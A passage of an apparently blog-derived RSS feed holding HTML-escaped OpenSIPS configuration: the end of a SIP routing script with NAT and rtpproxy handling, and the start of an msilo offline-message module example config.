&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#	return;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aliases&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound alias\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# native SIP destinations are handled using our USRLOC DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: usrloc applied\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route[1]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# !! Nathelper
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ru&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[@:](192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.)&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !search&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^Route:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;479&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;We don&amp;#39;t forward to private IP addresses&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# if client or server know to be behind a NAT, enable relay&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;isbflagset&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rtpproxy_offer&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# NAT processing of replies; apply to all transactions (for example,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# re-INVITEs from public to private UA are hard to identify as&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# NATed at the moment of request processing); look at replies&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# send it out now; use stateful forwarding as it works reliably&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# even for UDP2TCP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# !! Nathelper
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;onreply_route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# NATed transaction ?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;isbflagset&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $rs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(183)|2[0-9][0-9]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		fix_nated_contact&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rtpproxy_answer&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# otherwise, is it a transaction behind a NAT and we did not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# know at time of request processing ? (RFC1918 contacts)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nat_uac_test&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		fix_nated_contact&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>msilo</title>
      <link>https://wdd.js.org/opensips/ch8/msilo/</link>
      <pubDate>Thu, 28 May 2020 10:00:04 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/msilo/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# MSILO usage example
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $ID: daniel $
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_via&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no      &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -v)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;off           &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -r)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rev_dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;off       &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd. line: -R)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;textops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msilo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- registrar params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;default_expires&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;120)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- usrloc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- msilo params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;modparam(&amp;#34;msilo&amp;#34;, &amp;#34;db_url&amp;#34;, &amp;#34;mysql&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;//opensips:opensipsrw@localhost/opensips&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- tm params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timer&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timer&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wt_timer&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
